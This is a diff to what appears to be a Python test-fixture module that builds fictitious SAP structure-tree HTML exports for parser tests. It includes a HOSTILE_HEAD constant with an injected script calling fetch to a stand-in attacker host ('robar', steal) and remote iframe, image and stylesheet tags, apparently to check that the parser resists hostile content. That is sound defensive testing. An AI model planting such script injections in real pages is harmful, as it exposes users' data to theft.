@@ -19,6 +19,15 @@ from typing import Any
 
 __all__ = [
     "EQUIPMENT_CODE",
+    "STRUCTURE_TREE_EXPORT",
+    "TREE_EQUIPMENT_CODES",
+    "TREE_LOCATION",
+    "TREE_MATERIAL_CODES",
+    "structure_tree_export",
+    "tree_equipment_line",
+    "tree_material_line",
+    "tree_metadata_line",
+    "tree_root_line",
     "FRAGMENTED_EXPORT",
     "LOCATION",
     "MATERIAL_CODES",
@@ -121,3 +130,101 @@ def export_with(**overrides: Any) -> bytes:
     """Export por defecto con el cuerpo sustituido."""
     body: str = overrides.get("body") or _default_body()
     return build_export(body)
+
+
+# ---------------------------------------------------------------------
+# Export completo con la forma del árbol de estructura
+# ---------------------------------------------------------------------
+
+TREE_LOCATION = "LOC-FAKE-100"
+TREE_MATERIAL_CODES = ("FAKE0001", "90001234", "MAT-FAKE-200")
+TREE_EQUIPMENT_CODES = ("EQ-FAKE-100", "EQ-FAKE-200")
+
+
+def tree_metadata_line() -> str:
+    """Dos parejas etiqueta/valor en un mismo renglón."""
+    return (
+        f'<nobr id="t1">Ubic.t&eacute;cn.</nobr><nobr id="t2">{NBSP * 2}</nobr>'
+        f'<nobr id="t3">{TREE_LOCATION}</nobr><nobr id="t4">{NBSP * 2}</nobr>'
+        f'<nobr id="t5">V&aacute;lido de</nobr><nobr id="t6">{NBSP * 2}</nobr>'
+        f'<nobr id="t7">01.01.2026</nobr><br>\n'
+    )
+
+
+def tree_root_line() -> str:
+    """La raíz del activo declara los dos tipos a la vez."""
+    return (
+        f'<nobr id="t8">{TREE_LOCATION}</nobr><nobr id="t9">{NBSP}ACTIVO FICTICIO</nobr>'
+        '<img src="/sap/public/ficticio-a.gif" title="Material">'
+        '<img src="/sap/public/ficticio-b.gif" title="Equipo"><br>\n'
+    )
+
+
+def tree_material_line(code: str, payload: str, *, dings: str = "0") -> str:
+    """Un material **sin icono de material**, con el árbol y SAPDings delante.
+
+    El identificador va en su propio fragmento y la descripción, el estado, la
+    cantidad y la unidad comparten otro.
+    """
+    return (
+        '<input type="checkbox">'
+        f"<nobr>{NBSP * 2}</nobr><nobr>|---</nobr>"
+        f'<font face="SAPDings"><nobr>{dings}</nobr></font>'
+        f"<nobr>{NBSP}</nobr><nobr>{code}</nobr><nobr>{NBSP}{payload}</nobr><br>\n"
+    )
+
+
+def tree_equipment_line(code: str, description: str, *, attribute: str = "title") -> str:
+    """Un equipo hijo con el icono **fuera** de los `<nobr>`."""
+    return (
+        f"<nobr>{NBSP * 2}</nobr><nobr>|---</nobr><nobr>{code}</nobr>"
+        f"<nobr>{NBSP}{description}</nobr>"
+        f'<img src="/sap/public/ficticio-b.gif" {attribute}="Equipo"><br>\n'
+    )
+
+
+HOSTILE_HEAD = (
+    "<script>fetch('http://atacante.invalido/robar')</script>"
+    '<iframe src="https://remoto.invalido/marco"></iframe>'
+    '<img src="http://remoto.invalido/pixel.gif">'
+    '<link rel="stylesheet" href="https://remoto.invalido/x.css">'
+)
+
+
+def structure_tree_export(*, hostile: bool = True) -> bytes:
+    """Mini-export con la forma completa del árbol de estructura de SAP.
+
+    Contiene, en este orden: metadata con dos campos en una línea, metadata en
+    otra línea, una línea vacía, la raíz con los dos iconos, un conector, tres
+    materiales sin icono y dos equipos con icono.
+    """
+    body = (
+        (HOSTILE_HEAD if hostile else "")
+        + tree_metadata_line()
+        + "<nobr>Denominaci&oacute;n</nobr>"
+        + f"<nobr>{NBSP * 2}</nobr><nobr>ACTIVO FICTICIO</nobr><br>\n"
+        + f"<nobr>{NBSP}</nobr><br>\n"
+        + tree_root_line()
+        + f"<nobr>{NBSP * 2}</nobr><nobr>|</nobr><br>\n"
+        + tree_material_line(
+            TREE_MATERIAL_CODES[0],
+            f"REPUESTO FICTICIO 123 ABC{NBSP * 3}L{NBSP * 4}8{NBSP * 2}UN",
+        )
+        + tree_material_line(
+            TREE_MATERIAL_CODES[1],
+            f"OTRO REPUESTO 500 W{NBSP * 3}28{NBSP * 2}PZA",
+            dings="4",
+        )
+        + tree_material_line(
+            TREE_MATERIAL_CODES[2],
+            f"TERCER REPUESTO FICTICIO{NBSP * 3}1,5{NBSP * 2}KG",
+        )
+        + tree_equipment_line(TREE_EQUIPMENT_CODES[0], "EQUIPO FICTICIO PRIMARIO")
+        + tree_equipment_line(
+            TREE_EQUIPMENT_CODES[1], "EQUIPO FICTICIO SECUNDARIO", attribute="alt"
+        )
+    )
+    return build_export(body)
+
+
+STRUCTURE_TREE_EXPORT: bytes = structure_tree_export()
